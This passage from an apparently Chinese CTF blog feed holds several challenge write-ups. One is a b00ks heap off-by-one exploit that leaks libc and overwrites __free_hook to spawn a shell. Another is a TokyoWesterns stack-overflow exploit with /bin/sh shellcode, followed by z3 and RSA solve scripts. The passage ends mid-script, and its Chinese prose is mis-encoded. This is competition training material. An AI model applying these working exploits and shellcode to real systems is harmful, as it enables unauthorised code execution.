class="hljs assembly">0x55865b7c9040:    0x4141414141414141    0x41414141414141410x55865b7c9050:    0x4141414141414141    0x41414141414141410x55865b7c9060:    0x000055865cc0d100(0x60--&gt;0x00)    0x000055865cc0d190</code></pre><p><strong>1. åˆ›å»ºç¬¬ä¸€ä¸ªfirest book</strong></p><pre><code class="hljs assembly">0x55f276c74160:    0x0000000000000001                 0x000055f276c74020--&gt; Name0x55f276c74170:    0x000055f276c740c0(description)    0x000000000000008c(140)</code></pre><p>å½“<code>0x55f276c74160 --&gt; 0x55f276c74100</code>æ—¶, <code>0x55f276c74100</code>æ­£å¥½è½åœ¨<code>first b00k</code>çš„<code>description</code>ä¸­, å±äºå¯æ§èŒƒå›´, ä¸ºæˆ‘ä»¬ä¼ªé€ <code>b00k</code>æ‰“ä¸‹äº†åŸºç¡€.</p><p><strong>2. leak book1 addr</strong></p><p>my_read è¯»å…¥çš„ç»“æŸç¬¦ â€˜\x00â€™ ä¼šè¢«å†™å¦‚ book1 æ—¶è¦†ç›–</p><p>æ‰€ä»¥ print author name æ—¶ ä¼šæ³„éœ² book1 åœ¨ buf çš„åœ°å€</p><p><strong>3. ç”³è¯· book2</strong></p><p>book2çš„descriptionçš„å¤§å°è¶Šå¤§è¶Šå¥½(å¦‚0x21000)ï¼Œè¿™æ ·ä¼šé€šè¿‡mmap()å‡½æ•°å»åˆ†é…å †ç©ºé—´ï¼Œè€Œè¯¥å †åœ°å€ä¸libcçš„åŸºå€ç›¸å…³ï¼Œè¿™æ ·é€šè¿‡æ³„éœ²è¯¥å †åœ°å€å¯ä»¥è®¡ç®—å‡ºlibcçš„åŸºå€ã€‚</p><p><strong>4. ä¼ªé€ book</strong></p><pre><code class="hljs assembly">0x55f276c740c0:    0x4141414141414141    0x41414141414141410x55f276c740d0:    0x4141414141414141    0x41414141414141410x55f276c740e0:    0x4141414141414141    0x41414141414141410x55f276c740f0:    0x4141414141414141    0x41414141414141410x55f276c74100:    0x0000000000000001    0x000055f276c74198----0x55f276c74110:    0x000055f276c74198    0x000000000000ffff   |......                                                   |0x55f276c74160:    0x0000000000000001    0x000055f276c74020   |0x55f276c74170:    0x000055f276c740c0    0x000000000000008c   |0x55f276c74180:    0x0000000000000000    0x0000000000000031   |0x55f276c74190:    0x0000000000000002    0x00007f282b8e7010 &lt;-|0x55f276c741a0:    0x00007f282b8c5010    0x00000000000210000x55f276c741b0:    0x0000000000000000    0x0000000000020e51</code></pre><p>å¯ä»¥çœ‹åˆ°<code>0x55f276c74100</code>å·²ç»æ˜¯<code>fake b00k1</code></p><p><strong>5. ç©ºå­—èŠ‚è¦†ç›– leak book2 name pointer&amp;libcbase</strong></p><pre><code class="hljs assembly">0x55f275d55040:    0x4141414141414141    0x41414141414141410x55f275d55050:    0x4141414141414141    0x41414141414141410x55f275d55060:    0x000055f276c74100    0x000055f276c74190</code></pre><p>æ³„éœ²çš„æ˜¯<code>second b00k</code>çš„<code>name pointer</code>å’Œ<code>description pointer</code>.<br>è¿™ä¸ªæŒ‡é’ˆå’Œlibc base addressæ˜¯æœ‰ç›´æ¥è”ç³»çš„.</p><pre><code class="hljs assembly">0x000055f276c73000 0x000055f276c95000 rw-p    [heap]0x00007f282b33e000 0x00007f282b4fe000 r-xp    /lib/x86_64-linux-gnu/libc-2.23.so0x00007f282b4fe000 0x00007f282b6fe000 ---p    /lib/x86_64-linux-gnu/libc-2.23.so</code></pre><p>  <code>offset = 0x7f282b8e7010 - 0x00007f282b33e000 = 0x5a9010</code><br>  <strong>ç»“è®º:</strong> é€šè¿‡ä¼ªé€ çš„<code>b00k</code>, æˆ‘ä»¬æ³„éœ²äº† <code>libc base address</code>.</p><p>**6. è·å–ç›¸å…³æŒ‡é’ˆ</p><p>ä¸»è¦æ˜¯ä¸¤ä¸ª</p><pre><code class="hljs assembly">malloc_hook = libc.symbols[&apos;__free_hook&apos;] + libcbaseexecve_addr = libcbase + 0x4526a</code></pre><p> <strong>ç»“è®º:</strong>  é€šè¿‡<code>libc base address</code>, é€€å‡ºäº†<code>__free_hook</code>å’Œ<code>execve_addr</code>åœ¨ç¨‹åºä¸­çš„å®é™…ä½ç½®.</p><p><strong>7. ä¿®æ”¹ get shell</strong></p><p>é€šè¿‡å…ˆåä¿®æ”¹<code>book1_description</code>å’Œ<code>book2_description</code>ï¼Œå¯ä»¥å®ç°ä»»æ„åœ°å€å†™ä»»æ„å†…å®¹çš„åŠŸèƒ½ã€‚ç”±äºè¯¥ç¨‹åºå¯ç”¨äº†<code>FULL RELRO</code>ä¿æŠ¤æªæ–½ï¼Œæ— æ³•å¯¹<code>GOT</code>è¿›è¡Œæ”¹å†™ï¼Œä½†æ˜¯å¯ä»¥æ”¹å†™<code>__free_hook</code>æˆ–<code>__malloc_hook</code>ã€‚</p><p>é€šè¿‡<code>first b00k</code>ä¿®æ”¹<code>second b00k</code>çš„<code>description</code>æŒ‡é’ˆä¸º<code>__free_hook</code>, åœ¨ä¿®æ”¹second b00kçš„descriptionå†…å®¹ä¸º<code>execve(&quot;/bin/sh&quot;, null, environ)</code>, æœ€åæ‰§è¡Œ<code>free</code></p><pre><code class="hljs assembly">0x55f276c74190:    0x0000000000000002    0x00007f282b7047a8 --0x55f276c741a0:    0x00007f282b7047a8    0x0000000000021000  |......                                                  |0x7f282b7047a8 &lt;__free_hook&gt;:  0x00007f306ff4726a    0x0000000000000000</code></pre><p><strong>ç»“è®º:</strong> ç”±äº<code>__free_hook</code>é‡Œé¢çš„å†…å®¹ä¸ä¸º<code>NULL</code>, é‚æ‰§è¡Œå†…å®¹æŒ‡å‘çš„æŒ‡ä»¤, å³<code>execve(&quot;/bin/sh&quot;, null, environ)</code></p><h4 id="ç›¸å…³é—®é¢˜è§£ç­”">ç›¸å…³é—®é¢˜è§£ç­”<a class="post-anchor" href="#ç›¸å…³é—®é¢˜è§£ç­”"></a></h4><p><strong>ä¸ºä»€ä¹ˆç¬¬äºŒä¸ª b00kç”³è¯·çš„ç©ºé—´é‚£ä¹ˆå¤§?</strong></p><blockquote><p>â€‹    If we allocate a chunk bigger than the wilderness chunk, it  mmapâ€™s a new area for use. And this area is adjacent to the libcâ€™s bss  segment<br>ç®€å•çš„è¯´, ç”³è¯·å°äº†ä¸èƒ½å¤Ÿæ³„éœ²å‡º<code>libc base address</code></p></blockquote><p><strong>exp</strong></p><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-comment">#context.log_level = 'debug'</span>elf = ELF(<span class="hljs-string">"./b00ks"</span>)libc = ELF(<span class="hljs-string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)p = process(<span class="hljs-string">"./b00ks"</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create_name</span><span class="hljs-params">(name)</span>:</span>p.sendlineafter(<span class="hljs-string">"Enter author name: "</span>, name)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create_book</span><span class="hljs-params">(size,name,des_size,des)</span>:</span>p.sendlineafter(<span class="hljs-string">"&gt; "</span>,<span class="hljs-string">"1"</span>)p.sendlineafter(<span class="hljs-string">"\nEnter book name size: "</span>,str(size))p.sendlineafter(<span class="hljs-string">"Enter book name (Max 32 chars): "</span>,name)p.sendlineafter(<span class="hljs-string">"\nEnter book description size: "</span>, str(des_size))p.sendlineafter(<span class="hljs-string">"Enter book description: "</span>, des)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete_book</span><span class="hljs-params">(id)</span>:</span>p.sendlineafter(<span class="hljs-string">"&gt; "</span>, <span class="hljs-string">"2"</span>)p.sendlineafter(<span class="hljs-string">"Enter the book id you want to delete: "</span>, str(id))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit_book</span><span class="hljs-params">(id,new_des)</span>:</span>p.sendlineafter(<span class="hljs-string">"&gt; "</span>,<span class="hljs-string">"3"</span>)p.sendlineafter(<span class="hljs-string">"Enter the book id you want to edit: "</span>, str(id))p.sendlineafter(<span class="hljs-string">"Enter new book description: "</span>, new_des)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">memleak2</span><span class="hljs-params">()</span>:</span>p.sendlineafter(<span class="hljs-string">"&gt; "</span>,<span class="hljs-string">"4"</span>)p.recvuntil(<span class="hljs-string">"Name: "</span>)msg=p.recvline().strip(<span class="hljs-string">"\n"</span>)    msg=u64(msg.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">"\x00"</span>))    log.success(<span class="hljs-string">"Leaked address of second book name pointer : "</span> + hex(msg))    <span class="hljs-keyword">return</span> msg<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">change_name</span><span class="hljs-params">(name)</span>:</span>p.sendlineafter(<span class="hljs-string">"&gt; "</span>,<span class="hljs-string">"5"</span>)p.sendlineafter(<span class="hljs-string">"Enter author name: "</span>, name)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">memleak1</span><span class="hljs-params">()</span>:</span>p.recvuntil(<span class="hljs-string">"&gt; "</span>)p.sendline(<span class="hljs-string">"4"</span>)p.recvuntil(<span class="hljs-string">"Author:"</span>)msg = p.recvuntil(<span class="hljs-string">"\n"</span>,drop=<span class="hljs-literal">True</span>)[<span class="hljs-number">33</span>:]log.success(<span class="hljs-string">"msg : "</span>+msg)addr = u64(msg.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">"\x00"</span>))log.success(<span class="hljs-string">"Leaked address of first book : "</span> + hex(addr))<span class="hljs-keyword">return</span> addrcreate_name(<span class="hljs-string">"a"</span>*<span class="hljs-number">32</span>)create_book(<span class="hljs-number">140</span>,<span class="hljs-string">"a"</span>,<span class="hljs-number">140</span>,<span class="hljs-string">"a"</span>)<span class="hljs-comment">#leak book addr</span>first_addr = memleak1()second_addr = first_addr + <span class="hljs-number">0x38</span>log.success(<span class="hljs-string">"second addr : "</span> + hex(second_addr))<span class="hljs-comment">#create second book</span>create_book(<span class="hljs-number">0x21000</span>,<span class="hljs-string">"a"</span>,<span class="hljs-number">0x21000</span>,<span class="hljs-string">"a"</span>)<span class="hljs-comment">#fake first book</span>payload = <span class="hljs-string">"a"</span>*<span class="hljs-number">0x40</span> + p64(<span class="hljs-number">1</span>) + p64(second_addr)*<span class="hljs-number">2</span> + p64(<span class="hljs-number">0xffff</span>)edit_book(<span class="hljs-number">1</span>,payload)<span class="hljs-comment">#null byte off-by-one</span>change_name(<span class="hljs-string">"a"</span>*<span class="hljs-number">32</span>)<span class="hljs-comment">#leak second book pointer</span>sec_name_addr = memleak2()libcbase = sec_name_addr - <span class="hljs-number">0x5b0010</span>log.info(<span class="hljs-string">"libcbase: %s"</span> % hex(libcbase))free_hook = libc.symbols[<span class="hljs-string">'__free_hook'</span>] + libcbaselog.success(<span class="hljs-string">"free_hook : "</span> + hex(free_hook))execve_addr = libcbase + <span class="hljs-number">0x45216</span>log.success(<span class="hljs-string">"execve : "</span> + hex(execve_addr))<span class="hljs-comment">#gdb.attach(p)</span><span class="hljs-comment"># getshell</span>system = libc.symbols[<span class="hljs-string">'system'</span>] + libcbasebinsh_addr = libc.search(<span class="hljs-string">'/bin/sh'</span>).next() + libcbasepayload = p64(binsh_addr) + p64(free_hook)edit_book(<span class="hljs-number">1</span>, payload)payload = p64(system)edit_book(<span class="hljs-number">2</span>, payload)<span class="hljs-string">'''edit_book(1,p64(free_hook)*2)edit_book(2,p64(execve_addr))'''</span>delete_book(<span class="hljs-number">2</span>)p.interactive()</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TokyoWesternsCTF 2019 writeup</title>
      <link href="/2019/09/02/TokyoWesternsCTF-2019-writeup/"/>
      <url>/2019/09/02/TokyoWesternsCTF-2019-writeup/</url>
      
        <content type="html"><![CDATA[<p>tcl åšäº†ä¸‰é“ç­¾åˆ°é¢˜ç›®</p><h2 id="warmup">warmup<a class="post-anchor" href="#warmup"></a></h2><p>æ²¡æœ‰ä»»ä½•ä¿æŠ¤çš„æ ˆæº¢å‡º</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *elf=ELF(<span class="hljs-string">'./pwn'</span>)shellcode = <span class="hljs-string">"\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"</span>addr=<span class="hljs-number">0x0000000000601A00</span>buf=<span class="hljs-number">0x00007FFE0740F240</span>ret=<span class="hljs-number">0x00007FFE0740F348</span><span class="hljs-comment">#io=process('./pwn')</span><span class="hljs-comment">#pause()</span>io=remote(<span class="hljs-string">'nothing.chal.ctf.westerns.tokyo'</span>,<span class="hljs-number">10001</span>)io.sendline((ret-buf)*<span class="hljs-string">'a'</span>+p64(<span class="hljs-number">0x0000000000400773</span>)+p64(addr)+p64(elf.plt[<span class="hljs-string">'gets'</span>])+p64(addr))io.sendline(shellcode)io.interactive()</code></pre><h2 id="easy-crackme">easy_crackme<a class="post-anchor" href="#easy-crackme"></a></h2><p>è¿™é“é¢˜ç›®è€—æ—¶é—´æ¯”è¾ƒé•¿<br>æœ€åç”¨z3 ä¸€ä¸ªä¸€ä¸ªè¿›è¡Œçº¦æŸå³å¯</p><h3 id="check1">check1<a class="post-anchor" href="#check1"></a></h3><pre><code class="hljs cpp">v46 = '76543210';v47 = 'fedcba98';for ( i = 0; i &lt;= 15; ++i )&#123;  for ( j = strchr(s, *((char *)&amp;v46 + i)); j; j = strchr(j + 1, *((char *)&amp;v46 + i)) )    ++*((_DWORD *)&amp;s1 + i);&#125;if ( memcmp(&amp;s1, &amp;unk_400F00, 0x40uLL) )&#123;  puts("incorrect");  exit(0);&#125;</code></pre><p>åˆ¤æ–­å­—ç¬¦å‡ºç°æ¬¡æ•°</p><h3 id="check2">check2<a class="post-anchor" href="#check2"></a></h3><pre><code class="hljs cpp">v21 = <span class="hljs-number">0L</span>L;    v22 = <span class="hljs-number">0L</span>L;    v23 = <span class="hljs-number">0L</span>L;    v24 = <span class="hljs-number">0L</span>L;    v25 = <span class="hljs-number">0L</span>L;    v26 = <span class="hljs-number">0L</span>L;    v27 = <span class="hljs-number">0L</span>L;    v28 = <span class="hljs-number">0L</span>L;    <span class="hljs-keyword">for</span> ( k = <span class="hljs-number">0</span>; k &lt;= <span class="hljs-number">7</span>; ++k )    &#123;      v10 = <span class="hljs-number">0</span>;      v11 = <span class="hljs-number">0</span>;      <span class="hljs-keyword">for</span> ( l = <span class="hljs-number">0</span>; l &lt;= <span class="hljs-number">3</span>; ++l )                <span class="hljs-comment">// éå† &#123;***&#125; çš„å†…å®¹</span>      &#123;        v5 = s[<span class="hljs-number">4</span> * k + <span class="hljs-number">6</span> + l];        v10 += v5;        v11 ^= v5;      &#125;      *((_DWORD *)&amp;v21 + k) = v10;              <span class="hljs-comment">// å››ä¸ªä¸€ç»„çš„å’Œ</span>      *((_DWORD *)&amp;v25 + k) = v11;              <span class="hljs-comment">// å››ä¸ªä¸€ç»„å¼‚æˆ–çš„å€¼</span>    &#125;</code></pre><h3 id="check3">check3<a class="post-anchor" href="#check3"></a></h3><pre><code class="hljs cpp">v29 = <span class="hljs-number">0L</span>L;v30 = <span class="hljs-number">0L</span>L;v31 = <span class="hljs-number">0L</span>L;v32 = <span class="hljs-number">0L</span>L;v33 = <span class="hljs-number">0L</span>L;v34 = <span class="hljs-number">0L</span>L;v35 = <span class="hljs-number">0L</span>L;v36 = <span class="hljs-number">0L</span>L;<span class="hljs-keyword">for</span> ( m = <span class="hljs-number">0</span>; m &lt;= <span class="hljs-number">7</span>; ++m )&#123;  v14 = <span class="hljs-number">0</span>;  v15 = <span class="hljs-number">0</span>;  <span class="hljs-keyword">for</span> ( n = <span class="hljs-number">0</span>; n &lt;= <span class="hljs-number">3</span>; ++n )  &#123;    v6 = s[<span class="hljs-number">8</span> * n + <span class="hljs-number">6</span> + m];    v14 += v6;    v15 ^= v6;  &#125;  *((_DWORD *)&amp;v29 + m) = v14;  *((_DWORD *)&amp;v33 + m) = v15;&#125;<span class="hljs-keyword">if</span> ( <span class="hljs-built_in">memcmp</span>(&amp;v21, &amp;unk_400F40, <span class="hljs-number">0x20</span>uLL) || <span class="hljs-built_in">memcmp</span>(&amp;v25, &amp;unk_400F60, <span class="hljs-number">0x20</span>uLL) )&#123;  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"incorrect"</span>);  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);&#125;<span class="hljs-keyword">if</span> ( <span class="hljs-built_in">memcmp</span>(&amp;v29, &amp;unk_400FA0, <span class="hljs-number">0x20</span>uLL) || <span class="hljs-built_in">memcmp</span>(&amp;v33, &amp;unk_400F80, <span class="hljs-number">0x20</span>uLL) )&#123;  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"incorrect"</span>);  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);&#125;</code></pre><h3 id="check4">check4<a class="post-anchor" href="#check4"></a></h3><pre><code class="hljs cpp"><span class="hljs-built_in">memset</span>(v45, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(v45));<span class="hljs-keyword">for</span> ( ii = <span class="hljs-number">0</span>; ii &lt;= <span class="hljs-number">31</span>; ++ii )&#123;  v7 = s[ii + <span class="hljs-number">6</span>];  <span class="hljs-keyword">if</span> ( v7 &lt;= <span class="hljs-number">0x2F</span> || v7 &gt; <span class="hljs-number">0x39</span> )  &#123;    <span class="hljs-keyword">if</span> ( v7 &lt;= <span class="hljs-number">0x60</span> || v7 &gt; <span class="hljs-number">0x66</span> )      v45[ii] = <span class="hljs-number">0</span>;    <span class="hljs-keyword">else</span>      v45[ii] = <span class="hljs-number">0x80</span>;  &#125;  <span class="hljs-keyword">else</span>  &#123;    v45[ii] = <span class="hljs-number">0xFF</span>;  &#125;&#125;<span class="hljs-keyword">if</span> ( <span class="hljs-built_in">memcmp</span>(v45, &amp;unk_400FC0, <span class="hljs-number">0x80</span>uLL) )&#123;  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"incorrect"</span>);  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);&#125;</code></pre><h3 id="check5">check5<a class="post-anchor" href="#check5"></a></h3><pre><code class="hljs cpp">v18 = <span class="hljs-number">0</span>;    <span class="hljs-keyword">for</span> ( jj = <span class="hljs-number">0</span>; jj &lt;= <span class="hljs-number">15</span>; ++jj )      v18 += s[<span class="hljs-number">2</span> * (jj + <span class="hljs-number">3</span>)];    <span class="hljs-keyword">if</span> ( v18 != <span class="hljs-number">1160</span> )    &#123;      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"incorrect"</span>);      <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);    &#125;</code></pre><h3 id="check6">check6<a class="post-anchor" href="#check6"></a></h3><pre><code class="hljs cpp">  <span class="hljs-keyword">if</span> ( s[<span class="hljs-number">37</span>] != <span class="hljs-number">0x35</span> || s[<span class="hljs-number">7</span>] != <span class="hljs-number">102</span> || s[<span class="hljs-number">11</span>] != <span class="hljs-number">0x38</span> || s[<span class="hljs-number">12</span>] != <span class="hljs-number">0x37</span> || s[<span class="hljs-number">23</span>] != <span class="hljs-number">0x32</span> || s[<span class="hljs-number">31</span>] != <span class="hljs-number">0x34</span> )  &#123;    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"incorrect"</span>);    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);  &#125;  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Correct: %s\n"</span>, s, a2);  result = <span class="hljs-number">0L</span>L;&#125;</code></pre><p>è§£é¢˜è„šæœ¬å¦‚ä¸‹ï¼š</p><pre><code class="hljs python"><span class="hljs-comment"># !user/bin/python2.7</span><span class="hljs-comment"># coding:utf-8</span><span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> Counter<span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *s = Solver()flag = [BitVec(<span class="hljs-string">"a%d"</span>%i,<span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">32</span>)]sum1 = [<span class="hljs-number">0x15E</span>, <span class="hljs-number">0x0DA</span>, <span class="hljs-number">0x12F</span>, <span class="hljs-number">0x131</span>, <span class="hljs-number">0x100</span>, <span class="hljs-number">0x131</span>, <span class="hljs-number">0x0FB</span>, <span class="hljs-number">0x102</span>]xor1 = [<span class="hljs-number">0x52</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x58</span>]sum2 = [<span class="hljs-number">0x129</span>, <span class="hljs-number">0x103</span>, <span class="hljs-number">0x12B</span>, <span class="hljs-number">0x131</span>, <span class="hljs-number">0x135</span>, <span class="hljs-number">0x10B</span>, <span class="hljs-number">0x0FF</span>, <span class="hljs-number">0x0FF</span>]xor2 = [<span class="hljs-number">1</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x51</span>]cnt = [<span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]memcmp = [<span class="hljs-number">0x80</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xFF</span>]d = <span class="hljs-string">"0123456789abcdef"</span><span class="hljs-string">'''for i in range(0,16):s.add(str(flag).count(str(ord(d[i])))==cnt[i])'''</span><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">32</span>):<span class="hljs-keyword">if</span> memcmp[j] == <span class="hljs-number">0x80</span>:s.add(flag[j]&gt; <span class="hljs-number">0x60</span>)s.add(flag[j]&lt;=<span class="hljs-number">0x66</span>)<span class="hljs-keyword">else</span>:s.add(flag[j]&lt;=<span class="hljs-number">0x39</span>)s.add(flag[j]&gt; <span class="hljs-number">0x2f</span>)<span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> flag:s.add(<span class="hljs-number">0x30</span>&lt;=x)s.add(<span class="hljs-number">0x67</span>&gt;x)s.add(flag[<span class="hljs-number">1</span>]==<span class="hljs-number">102</span>)s.add(flag[<span class="hljs-number">5</span>]==<span class="hljs-number">0x38</span>)s.add(flag[<span class="hljs-number">6</span>]==<span class="hljs-number">0x37</span>)s.add(flag[<span class="hljs-number">17</span>]==<span class="hljs-number">0x32</span>)s.add(flag[<span class="hljs-number">25</span>]==<span class="hljs-number">0x34</span>)s.add(flag[<span class="hljs-number">31</span>]==<span class="hljs-number">0x35</span>)<span class="hljs-comment">#for i in range(len())</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(flag)):s.add(flag[i]!=<span class="hljs-number">51</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,len(flag),<span class="hljs-number">4</span>):s.add(flag[i]+flag[i+<span class="hljs-number">1</span>]+flag[i+<span class="hljs-number">2</span>]+flag[i+<span class="hljs-number">3</span>]==sum1[i/<span class="hljs-number">4</span>])s.add(flag[i]^flag[i+<span class="hljs-number">1</span>]^flag[i+<span class="hljs-number">2</span>]^flag[i+<span class="hljs-number">3</span>]==xor1[i/<span class="hljs-number">4</span>])<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">8</span>):s.add(flag[i]+flag[i+<span class="hljs-number">8</span>]+flag[i+<span class="hljs-number">16</span>]+flag[i+<span class="hljs-number">24</span>]==sum2[i])s.add(flag[i]^flag[i+<span class="hljs-number">8</span>]^flag[i+<span class="hljs-number">16</span>]^flag[i+<span class="hljs-number">24</span>]==xor2[i])sum = <span class="hljs-number">0</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">32</span>,<span class="hljs-number">2</span>):sum += flag[i]s.add(sum == <span class="hljs-number">1160</span>)<span class="hljs-keyword">print</span> <span class="hljs-string">"[-] check sat Â·Â·Â·Â·Â·"</span><span class="hljs-keyword">if</span> s.check() == sat:m = s.model()<span class="hljs-keyword">print</span> m<span class="hljs-keyword">print</span> <span class="hljs-string">"[+] print flag Â·Â·Â·Â·Â·"</span>kk = <span class="hljs-string">""</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">32</span>):kk +=  chr(int(<span class="hljs-string">"%s"</span> % (m[flag[i]])))<span class="hljs-keyword">print</span> <span class="hljs-string">"TWCTF&#123;"</span>+kk+<span class="hljs-string">"&#125;"</span><span class="hljs-keyword">else</span>:<span class="hljs-keyword">print</span> <span class="hljs-string">"[+] False     Â·Â·Â·Â·Â·"</span></code></pre><h2 id="real-baby-rsa">real baby rsa<a class="post-anchor" href="#real-baby-rsa"></a></h2><p>åŠ å¯†æ˜¯é€ä¸ªå­—ç¬¦åŠ å¯†<br>æˆ‘ä»¬å¯ä»¥åŠ å¯†æ‰€æœ‰å¯è§å­—ç¬¦<br>ç„¶åå¯¹æ¯”å‡ºflag</p><pre><code class="hljs python">flag = <span class="hljs-string">'TWCTF&#123;CENSORED&#125;'</span><span class="hljs-keyword">import</span> libnum<span class="hljs-comment"># Public Parameters</span>N = <span class="hljs-number">36239973541558932215768154398027510542999295460598793991863043974317503405132258743580804101986195705838099875086956063357178601077684772324064096356684008573295186622116931603804539480260180369510754948354952843990891989516977978839158915835381010468654190434058825525303974958222956513586121683284362090515808508044283236502801777575604829177236616682941566165356433922623572630453807517714014758581695760621278985339321003215237271785789328502527807304614754314937458797885837846005142762002103727753034387997014140695908371141458803486809615038309524628617159265412467046813293232560959236865127539835290549091</span>e = <span class="hljs-number">65537</span><span class="hljs-string">'''# Encrypt the flag!for char in flag:    print(pow(ord(char), e, N))'''</span>dic = <span class="hljs-string">"TWCTF&#125;&#123;QWERTYUIOPASDFGHJKLZXCVBNM?/&gt;&lt;.,:;\"\'[]qwertyuiopasdfghjklzxcvbnm0123456789!@#$%^&amp;*()_-+=~`"</span>flag = <span class="hljs-string">""</span><span class="hljs-keyword">with</span> open(<span class="hljs-string">'output'</span>) <span class="hljs-keyword">as</span> f:<span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:xx = line.rstrip()<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> dic:zz = str(pow(ord(i),e,N))<span class="hljs-keyword">if</span> xx[:<span class="hljs-number">600</span>] == zz[:<span class="hljs-number">600</span>]:flag += i<span class="hljs-keyword">break</span><span class="hljs-keyword">print</span> flag</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> write up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019å¼ºç½‘æ¯-copperstudy</title>
      <link href="/2019/07/17/2019%E5%BC%BA%E7%BD%91%E6%9D%AF-copperstudy/"/>
      <url>/2019/07/17/2019%E5%BC%BA%E7%BD%91%E6%9D%AF-copperstudy/</url>
      
        <content type="html"><![CDATA[<h2 id="copperstudy-â€“-coppersmith">copperstudy â€“ coppersmith<a class="post-anchor" href="#copperstudy-â€“-coppersmith"></a></h2><p>è§£é¢˜è„šæœ¬</p><pre><code class="hljs python"><span class="hljs-comment">#coding:utf-8</span><span class="hljs-keyword">import</span> hashlib<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> time<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">cha1</span><span class="hljs-params">(s,s256)</span>:</span>ss = <span class="hljs-string">''</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">5</span>):ss = ss + chr(int((s[<span class="hljs-number">2</span> * i] + s[<span class="hljs-number">2</span> * i + <span class="hljs-number">1</span>]),<span class="hljs-number">16</span>))<span class="hljs-keyword">for</span> i <span 